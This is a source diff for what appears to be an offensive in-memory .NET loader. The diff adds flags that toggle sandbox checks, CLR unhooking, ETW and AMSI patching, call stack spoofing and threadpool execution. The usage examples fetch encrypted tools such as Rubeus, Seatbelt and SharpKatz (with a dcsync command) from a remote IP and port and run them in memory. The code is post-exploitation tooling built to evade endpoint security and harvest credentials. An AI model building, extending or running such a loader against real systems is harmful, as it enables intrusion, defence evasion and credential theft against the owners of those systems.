@@ -1,3 +1,4 @@
+#include "config.h"
 #include "peb_walk.h"
 #include "hash.h"
 #include "obfstr.h"
@@ -21,10 +22,17 @@ static void print_usage(const char* exe) {
     printf("  assembly_args     Arguments passed to the .NET assembly\n\n");
     printf("Options:\n");
     printf("  -h, --help        Show this help message\n");
-    printf("  --no-sandbox      Disable sandbox/VM checks\n\n");
+    printf("  --no-sandbox      Disable sandbox/VM checks\n");
+    printf("  --no-unhook       Skip CLR module unhooking\n");
+    printf("  --no-etw          Skip ETW patching\n");
+    printf("  --no-amsi         Skip AMSI patching\n");
+    printf("  --no-threadpool   Run on main thread (keeps impersonation token)\n");
+    printf("  --no-spoof        Disable call stack spoofing\n");
+    printf("  --stealth-off     Disable all evasion (unhook+etw+amsi+spoof)\n\n");
     printf("Examples:\n");
     printf("  %s 192.168.1.10 8443 /Rubeus.enc triage\n", exe);
     printf("  %s --no-sandbox 10.0.0.5 80 /Seatbelt.enc -group=all\n", exe);
+    printf("  %s --no-threadpool 10.0.0.5 80 /SharpKatz.enc --Command dcsync\n", exe);
 }
 
 static bool sandbox_check() {
@@ -49,19 +57,35 @@ static bool sandbox_check() {
 int main(int argc, char* argv[]) {
     if (argc < 2) { print_usage(argv[0]); return 1; }
 
+    LoaderConfig config = {};
     int arg_offset = 1;
-    bool skip_sandbox = false;
 
-    if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
-        print_usage(argv[0]);
-        return 0;
-    }
-    if (strcmp(argv[1], "--no-sandbox") == 0) {
-        skip_sandbox = true;
-        arg_offset = 2;
+    while (arg_offset < argc && argv[arg_offset][0] == '-') {
+        const char* flag = argv[arg_offset];
+
+        if (strcmp(flag, "-h") == 0 || strcmp(flag, "--help") == 0) {
+            print_usage(argv[0]);
+            return 0;
+        }
+        else if (strcmp(flag, "--no-sandbox") == 0)    config.no_sandbox = true;
+        else if (strcmp(flag, "--no-unhook") == 0)      config.no_unhook = true;
+        else if (strcmp(flag, "--no-etw") == 0)          config.no_etw = true;
+        else if (strcmp(flag, "--no-amsi") == 0)         config.no_amsi = true;
+        else if (strcmp(flag, "--no-threadpool") == 0)   config.no_threadpool = true;
+        else if (strcmp(flag, "--no-spoof") == 0)        config.no_spoof = true;
+        else if (strcmp(flag, "--stealth-off") == 0) {
+            config.no_unhook = true;
+            config.no_etw = true;
+            config.no_amsi = true;
+            config.no_spoof = true;
+        }
+        else {
+            break;
+        }
+        arg_offset++;
     }
 
-    if (!skip_sandbox && !sandbox_check()) return 0;
+    if (!config.no_sandbox && !sandbox_check()) return 0;
 
     int remaining = argc - arg_offset;
     if (remaining < 3) { print_usage(argv[0]); return 1; }
@@ -76,7 +100,10 @@ int main(int argc, char* argv[]) {
     if (!resolve_phase1_ntdll()) return 1;
     if (!resolve_phase2_kernel32()) return 1;
     if (!resolve_syscalls()) return 1;
-    init_spoof();
+
+    if (!config.no_spoof) {
+        init_spoof();
+    }
 
     if (!resolve_phase3_winsock()) return 1;
 
@@ -96,7 +123,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    bool exec_ok = execute_via_threadpool(enc_payload, enc_size, asm_args, asm_argc);
+    bool exec_ok = execute_via_threadpool(enc_payload, enc_size, asm_args, asm_argc, &config);
 
     if (enc_payload) {
         volatile unsigned char* vp = reinterpret_cast<volatile unsigned char*>(enc_payload);
